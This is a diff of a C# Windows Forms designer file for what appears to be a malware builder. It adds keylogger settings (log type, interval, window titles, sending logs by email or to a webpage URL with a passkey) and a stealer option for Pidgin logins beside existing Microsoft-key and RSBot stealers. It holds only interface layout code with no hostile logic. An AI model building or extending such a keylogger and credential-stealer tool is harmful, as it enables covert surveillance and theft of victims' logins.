@@ -40,6 +40,12 @@
             this.radioButtonMainBotnet = new System.Windows.Forms.RadioButton();
             this.radioButtonMainKeylogger = new System.Windows.Forms.RadioButton();
             this.tabPageKeylogger = new System.Windows.Forms.TabPage();
+            this.groupBoxLogType = new System.Windows.Forms.GroupBox();
+            this.radioButtonKeyloggerLogFull = new System.Windows.Forms.RadioButton();
+            this.radioButtonKeyloggerLogAlphaNumeric = new System.Windows.Forms.RadioButton();
+            this.labelKeyloggerInterval = new System.Windows.Forms.Label();
+            this.numericUpDownKeyloggerInterval = new System.Windows.Forms.NumericUpDown();
+            this.checkBoxKeyloggerWindowTitles = new System.Windows.Forms.CheckBox();
             this.groupBoxKeyloggerSend = new System.Windows.Forms.GroupBox();
             this.radioButton = new System.Windows.Forms.RadioButton();
             this.radioButtonKeyloggerSendEmail = new System.Windows.Forms.RadioButton();
@@ -54,25 +60,25 @@
             this.textBoxKeyloggerEmailAddress = new System.Windows.Forms.TextBox();
             this.labelKeyloggerEmailFromName = new System.Windows.Forms.Label();
             this.tabPageStealer = new System.Windows.Forms.TabPage();
+            this.checkBoxStealerPidgin = new System.Windows.Forms.CheckBox();
             this.checkBoxStealersMicrosoftKeys = new System.Windows.Forms.CheckBox();
             this.checkBoxStealersRSBot = new System.Windows.Forms.CheckBox();
-            this.checkBoxKeyloggerWindowTitles = new System.Windows.Forms.CheckBox();
-            this.numericUpDownKeyloggerInterval = new System.Windows.Forms.NumericUpDown();
-            this.labelKeyloggerInterval = new System.Windows.Forms.Label();
-            this.groupBoxLogType = new System.Windows.Forms.GroupBox();
-            this.radioButtonKeyloggerLogFull = new System.Windows.Forms.RadioButton();
-            this.radioButtonKeyloggerLogAlphaNumeric = new System.Windows.Forms.RadioButton();
-            this.checkBoxStealerPidgin = new System.Windows.Forms.CheckBox();
+            this.groupBoxKeyloggerWebpage = new System.Windows.Forms.GroupBox();
+            this.textBoxKeyloggerWebpageUrl = new System.Windows.Forms.TextBox();
+            this.labelKeyloggerWebpageUrl = new System.Windows.Forms.Label();
+            this.textBox1 = new System.Windows.Forms.TextBox();
+            this.labelKeyloggerWebpagePasskey = new System.Windows.Forms.Label();
             this.menuStrip.SuspendLayout();
             this.tabControl.SuspendLayout();
             this.tabPageMain.SuspendLayout();
             this.groupBoxMainType.SuspendLayout();
             this.tabPageKeylogger.SuspendLayout();
+            this.groupBoxLogType.SuspendLayout();
+            ((System.ComponentModel.ISupportInitialize)(this.numericUpDownKeyloggerInterval)).BeginInit();
             this.groupBoxKeyloggerSend.SuspendLayout();
             this.groupBoxKeyloggerEmail.SuspendLayout();
             this.tabPageStealer.SuspendLayout();
-            ((System.ComponentModel.ISupportInitialize)(this.numericUpDownKeyloggerInterval)).BeginInit();
-            this.groupBoxLogType.SuspendLayout();
+            this.groupBoxKeyloggerWebpage.SuspendLayout();
             this.SuspendLayout();
             // 
             // menuStrip
@@ -103,7 +109,7 @@
             // exitToolStripMenuItem
             // 
             this.exitToolStripMenuItem.Name = "exitToolStripMenuItem";
-            this.exitToolStripMenuItem.Size = new System.Drawing.Size(152, 22);
+            this.exitToolStripMenuItem.Size = new System.Drawing.Size(101, 22);
             this.exitToolStripMenuItem.Text = "E&xit";
             this.exitToolStripMenuItem.Click += new System.EventHandler(this.exitToolStripMenuItem_Click);
             // 
@@ -185,6 +191,7 @@
             // 
             // tabPageKeylogger
             // 
+            this.tabPageKeylogger.Controls.Add(this.groupBoxKeyloggerWebpage);
             this.tabPageKeylogger.Controls.Add(this.groupBoxLogType);
             this.tabPageKeylogger.Controls.Add(this.labelKeyloggerInterval);
             this.tabPageKeylogger.Controls.Add(this.numericUpDownKeyloggerInterval);
@@ -198,6 +205,80 @@
             this.tabPageKeylogger.TabIndex = 1;
             this.tabPageKeylogger.Text = "Keylogger";
             this.tabPageKeylogger.UseVisualStyleBackColor = true;
+            // 
+            // groupBoxLogType
+            // 
+            this.groupBoxLogType.Controls.Add(this.radioButtonKeyloggerLogFull);
+            this.groupBoxLogType.Controls.Add(this.radioButtonKeyloggerLogAlphaNumeric);
+            this.groupBoxLogType.Location = new System.Drawing.Point(214, 61);
+            this.groupBoxLogType.Name = "groupBoxLogType";
+            this.groupBoxLogType.Size = new System.Drawing.Size(200, 49);
+            this.groupBoxLogType.TabIndex = 2;
+            this.groupBoxLogType.TabStop = false;
+            this.groupBoxLogType.Text = "Log Type";
+            // 
+            // radioButtonKeyloggerLogFull
+            // 
+            this.radioButtonKeyloggerLogFull.AutoSize = true;
+            this.radioButtonKeyloggerLogFull.Location = new System.Drawing.Point(117, 19);
+            this.radioButtonKeyloggerLogFull.Name = "radioButtonKeyloggerLogFull";
+            this.radioButtonKeyloggerLogFull.Size = new System.Drawing.Size(41, 17);
+            this.radioButtonKeyloggerLogFull.TabIndex = 1;
+            this.radioButtonKeyloggerLogFull.TabStop = true;
+            this.radioButtonKeyloggerLogFull.Text = "Full";
+            this.radioButtonKeyloggerLogFull.UseVisualStyleBackColor = true;
+            // 
+            // radioButtonKeyloggerLogAlphaNumeric
+            // 
+            this.radioButtonKeyloggerLogAlphaNumeric.AutoSize = true;
+            this.radioButtonKeyloggerLogAlphaNumeric.Location = new System.Drawing.Point(6, 19);
+            this.radioButtonKeyloggerLogAlphaNumeric.Name = "radioButtonKeyloggerLogAlphaNumeric";
+            this.radioButtonKeyloggerLogAlphaNumeric.Size = new System.Drawing.Size(91, 17);
+            this.radioButtonKeyloggerLogAlphaNumeric.TabIndex = 0;
+            this.radioButtonKeyloggerLogAlphaNumeric.TabStop = true;
+            this.radioButtonKeyloggerLogAlphaNumeric.Text = "AlphaNumeric";
+            this.radioButtonKeyloggerLogAlphaNumeric.UseVisualStyleBackColor = true;
+            // 
+            // labelKeyloggerInterval
+            // 
+            this.labelKeyloggerInterval.AutoSize = true;
+            this.labelKeyloggerInterval.Location = new System.Drawing.Point(279, 36);
+            this.labelKeyloggerInterval.Name = "labelKeyloggerInterval";
+            this.labelKeyloggerInterval.Size = new System.Drawing.Size(93, 13);
+            this.labelKeyloggerInterval.TabIndex = 9;
+            this.labelKeyloggerInterval.Text = "Interval in Minutes";
+            // 
+            // numericUpDownKeyloggerInterval
+            // 
+            this.numericUpDownKeyloggerInterval.Location = new System.Drawing.Point(215, 34);
+            this.numericUpDownKeyloggerInterval.Maximum = new decimal(new int[] {
+            43200,
+            0,
+            0,
+            0});
+            this.numericUpDownKeyloggerInterval.Minimum = new decimal(new int[] {
+            1,
+            0,
+            0,
+            0});
+            this.numericUpDownKeyloggerInterval.Name = "numericUpDownKeyloggerInterval";
+            this.numericUpDownKeyloggerInterval.Size = new System.Drawing.Size(58, 20);
+            this.numericUpDownKeyloggerInterval.TabIndex = 3;
+            this.numericUpDownKeyloggerInterval.Value = new decimal(new int[] {
+            1,
+            0,
+            0,
+            0});
+            // 
+            // checkBoxKeyloggerWindowTitles
+            // 
+            this.checkBoxKeyloggerWindowTitles.AutoSize = true;
+            this.checkBoxKeyloggerWindowTitles.Location = new System.Drawing.Point(214, 15);
+            this.checkBoxKeyloggerWindowTitles.Name = "checkBoxKeyloggerWindowTitles";
+            this.checkBoxKeyloggerWindowTitles.Size = new System.Drawing.Size(131, 17);
+            this.checkBoxKeyloggerWindowTitles.TabIndex = 2;
+            this.checkBoxKeyloggerWindowTitles.Text = "Include Window Titles";
+            this.checkBoxKeyloggerWindowTitles.UseVisualStyleBackColor = true;
             // 
             // groupBoxKeyloggerSend
             // 
@@ -213,6 +294,7 @@
             // radioButton
             // 
             this.radioButton.AutoSize = true;
+            this.radioButton.Enabled = false;
             this.radioButton.Location = new System.Drawing.Point(62, 19);
             this.radioButton.Name = "radioButton";
             this.radioButton.Size = new System.Drawing.Size(72, 17);
@@ -344,6 +426,16 @@
             this.tabPageStealer.Text = "Stealers";
             this.tabPageStealer.UseVisualStyleBackColor = true;
             // 
+            // checkBoxStealerPidgin
+            // 
+            this.checkBoxStealerPidgin.AutoSize = true;
+            this.checkBoxStealerPidgin.Location = new System.Drawing.Point(8, 52);
+            this.checkBoxStealerPidgin.Name = "checkBoxStealerPidgin";
+            this.checkBoxStealerPidgin.Size = new System.Drawing.Size(89, 17);
+            this.checkBoxStealerPidgin.TabIndex = 2;
+            this.checkBoxStealerPidgin.Text = "Pidgin Logins";
+            this.checkBoxStealerPidgin.UseVisualStyleBackColor = true;
+            // 
             // checkBoxStealersMicrosoftKeys
             // 
             this.checkBoxStealersMicrosoftKeys.AutoSize = true;
@@ -364,89 +456,51 @@
             this.checkBoxStealersRSBot.Text = "RSBot";
             this.checkBoxStealersRSBot.UseVisualStyleBackColor = true;
             // 
-            // checkBoxKeyloggerWindowTitles
+            // groupBoxKeyloggerWebpage
             // 
-            this.checkBoxKeyloggerWindowTitles.AutoSize = true;
-            this.checkBoxKeyloggerWindowTitles.Location = new System.Drawing.Point(214, 15);
-            this.checkBoxKeyloggerWindowTitles.Name = "checkBoxKeyloggerWindowTitles";
-            this.checkBoxKeyloggerWindowTitles.Size = new System.Drawing.Size(131, 17);
-            this.checkBoxKeyloggerWindowTitles.TabIndex = 2;
-            this.checkBoxKeyloggerWindowTitles.Text = "Include Window Titles";
-            this.checkBoxKeyloggerWindowTitles.UseVisualStyleBackColor = true;
+            this.groupBoxKeyloggerWebpage.Controls.Add(this.textBox1);
+            this.groupBoxKeyloggerWebpage.Controls.Add(this.labelKeyloggerWebpagePasskey);
+            this.groupBoxKeyloggerWebpage.Controls.Add(this.textBoxKeyloggerWebpageUrl);
+            this.groupBoxKeyloggerWebpage.Controls.Add(this.labelKeyloggerWebpageUrl);
+            this.groupBoxKeyloggerWebpage.Enabled = false;
+            this.groupBoxKeyloggerWebpage.Location = new System.Drawing.Point(214, 116);
+            this.groupBoxKeyloggerWebpage.Name = "groupBoxKeyloggerWebpage";
+            this.groupBoxKeyloggerWebpage.Size = new System.Drawing.Size(200, 94);
+            this.groupBoxKeyloggerWebpage.TabIndex = 10;
+            this.groupBoxKeyloggerWebpage.TabStop = false;
+            this.groupBoxKeyloggerWebpage.Text = "Webpage";
             // 
-            // numericUpDownKeyloggerInterval
+            // textBoxKeyloggerWebpageUrl
             // 
-            this.numericUpDownKeyloggerInterval.Location = new System.Drawing.Point(215, 34);
-            this.numericUpDownKeyloggerInterval.Maximum = new decimal(new int[] {
-            43200,
-            0,
-            0,
-            0});
-            this.numericUpDownKeyloggerInterval.Minimum = new decimal(new int[] {
-            1,
-            0,
-            0,
-            0});
-            this.numericUpDownKeyloggerInterval.Name = "numericUpDownKeyloggerInterval";
-            this.numericUpDownKeyloggerInterval.Size = new System.Drawing.Size(58, 20);
-            this.numericUpDownKeyloggerInterval.TabIndex = 3;
-            this.numericUpDownKeyloggerInterval.Value = new decimal(new int[] {
-            1,
-            0,
-            0,
-            0});
+            this.textBoxKeyloggerWebpageUrl.Location = new System.Drawing.Point(60, 20);
+            this.textBoxKeyloggerWebpageUrl.Name = "textBoxKeyloggerWebpageUrl";
+            this.textBoxKeyloggerWebpageUrl.Size = new System.Drawing.Size(125, 20);
+            this.textBoxKeyloggerWebpageUrl.TabIndex = 10;
             // 
-            // labelKeyloggerInterval
+            // labelKeyloggerWebpageUrl
             // 
-            this.labelKeyloggerInterval.AutoSize = true;
-            this.labelKeyloggerInterval.Location = new System.Drawing.Point(279, 36);
-            this.labelKeyloggerInterval.Name = "labelKeyloggerInterval";
-            this.labelKeyloggerInterval.Size = new System.Drawing.Size(93, 13);
-            this.labelKeyloggerInterval.TabIndex = 9;
-            this.labelKeyloggerInterval.Text = "Interval in Minutes";
+            this.labelKeyloggerWebpageUrl.AutoSize = true;
+            this.labelKeyloggerWebpageUrl.Location = new System.Drawing.Point(6, 23);
+            this.labelKeyloggerWebpageUrl.Name = "labelKeyloggerWebpageUrl";
+            this.labelKeyloggerWebpageUrl.Size = new System.Drawing.Size(48, 13);
+            this.labelKeyloggerWebpageUrl.TabIndex = 9;
+            this.labelKeyloggerWebpageUrl.Text = "Page Url";
             // 
-            // groupBoxLogType
+            // textBox1
             // 
-            this.groupBoxLogType.Controls.Add(this.radioButtonKeyloggerLogFull);
-            this.groupBoxLogType.Controls.Add(this.radioButtonKeyloggerLogAlphaNumeric);
-            this.groupBoxLogType.Location = new System.Drawing.Point(214, 61);
-            this.groupBoxLogType.Name = "groupBoxLogType";
-            this.groupBoxLogType.Size = new System.Drawing.Size(158, 49);
-            this.groupBoxLogType.TabIndex = 2;
-            this.groupBoxLogType.TabStop = false;
-            this.groupBoxLogType.Text = "Log Type";
+            this.textBox1.Location = new System.Drawing.Point(60, 46);
+            this.textBox1.Name = "textBox1";
+            this.textBox1.Size = new System.Drawing.Size(125, 20);
+            this.textBox1.TabIndex = 12;
             // 
-            // radioButtonKeyloggerLogFull
+            // labelKeyloggerWebpagePasskey
             // 
-            this.radioButtonKeyloggerLogFull.AutoSize = true;
-            this.radioButtonKeyloggerLogFull.Location = new System.Drawing.Point(103, 18);
-            this.radioButtonKeyloggerLogFull.Name = "radioButtonKeyloggerLogFull";
-            this.radioButtonKeyloggerLogFull.Size = new System.Drawing.Size(41, 17);
-            this.radioButtonKeyloggerLogFull.TabIndex = 1;
-            this.radioButtonKeyloggerLogFull.TabStop = true;
-            this.radioButtonKeyloggerLogFull.Text = "Full";
-            this.radioButtonKeyloggerLogFull.UseVisualStyleBackColor = true;
-            // 
-            // radioButtonKeyloggerLogAlphaNumeric
-            // 
-            this.radioButtonKeyloggerLogAlphaNumeric.AutoSize = true;
-            this.radioButtonKeyloggerLogAlphaNumeric.Location = new System.Drawing.Point(6, 19);
-            this.radioButtonKeyloggerLogAlphaNumeric.Name = "radioButtonKeyloggerLogAlphaNumeric";
-            this.radioButtonKeyloggerLogAlphaNumeric.Size = new System.Drawing.Size(91, 17);
-            this.radioButtonKeyloggerLogAlphaNumeric.TabIndex = 0;
-            this.radioButtonKeyloggerLogAlphaNumeric.TabStop = true;
-            this.radioButtonKeyloggerLogAlphaNumeric.Text = "AlphaNumeric";
-            this.radioButtonKeyloggerLogAlphaNumeric.UseVisualStyleBackColor = true;
-            // 
-            // checkBoxStealerPidgin
-            // 
-            this.checkBoxStealerPidgin.AutoSize = true;
-            this.checkBoxStealerPidgin.Location = new System.Drawing.Point(8, 52);
-            this.checkBoxStealerPidgin.Name = "checkBoxStealerPidgin";
-            this.checkBoxStealerPidgin.Size = new System.Drawing.Size(89, 17);
-            this.checkBoxStealerPidgin.TabIndex = 2;
-            this.checkBoxStealerPidgin.Text = "Pidgin Logins";
-            this.checkBoxStealerPidgin.UseVisualStyleBackColor = true;
+            this.labelKeyloggerWebpagePasskey.AutoSize = true;
+            this.labelKeyloggerWebpagePasskey.Location = new System.Drawing.Point(6, 49);
+            this.labelKeyloggerWebpagePasskey.Name = "labelKeyloggerWebpagePasskey";
+            this.labelKeyloggerWebpagePasskey.Size = new System.Drawing.Size(47, 13);
+            this.labelKeyloggerWebpagePasskey.TabIndex = 11;
+            this.labelKeyloggerWebpagePasskey.Text = "Passkey";
             // 
             // MainForm
             // 
@@ -467,15 +521,17 @@
             this.groupBoxMainType.PerformLayout();
             this.tabPageKeylogger.ResumeLayout(false);
             this.tabPageKeylogger.PerformLayout();
+            this.groupBoxLogType.ResumeLayout(false);
+            this.groupBoxLogType.PerformLayout();
+            ((System.ComponentModel.ISupportInitialize)(this.numericUpDownKeyloggerInterval)).EndInit();
             this.groupBoxKeyloggerSend.ResumeLayout(false);
             this.groupBoxKeyloggerSend.PerformLayout();
             this.groupBoxKeyloggerEmail.ResumeLayout(false);
             this.groupBoxKeyloggerEmail.PerformLayout();
             this.tabPageStealer.ResumeLayout(false);
             this.tabPageStealer.PerformLayout();
-            ((System.ComponentModel.ISupportInitialize)(this.numericUpDownKeyloggerInterval)).EndInit();
-            this.groupBoxLogType.ResumeLayout(false);
-            this.groupBoxLogType.PerformLayout();
+            this.groupBoxKeyloggerWebpage.ResumeLayout(false);
+            this.groupBoxKeyloggerWebpage.PerformLayout();
             this.ResumeLayout(false);
             this.PerformLayout();
 
@@ -518,6 +574,11 @@
         private System.Windows.Forms.NumericUpDown numericUpDownKeyloggerInterval;
         private System.Windows.Forms.CheckBox checkBoxKeyloggerWindowTitles;
         private System.Windows.Forms.CheckBox checkBoxStealerPidgin;
+        private System.Windows.Forms.GroupBox groupBoxKeyloggerWebpage;
+        private System.Windows.Forms.TextBox textBox1;
+        private System.Windows.Forms.Label labelKeyloggerWebpagePasskey;
+        private System.Windows.Forms.TextBox textBoxKeyloggerWebpageUrl;
+        private System.Windows.Forms.Label labelKeyloggerWebpageUrl;
     }
 }
 
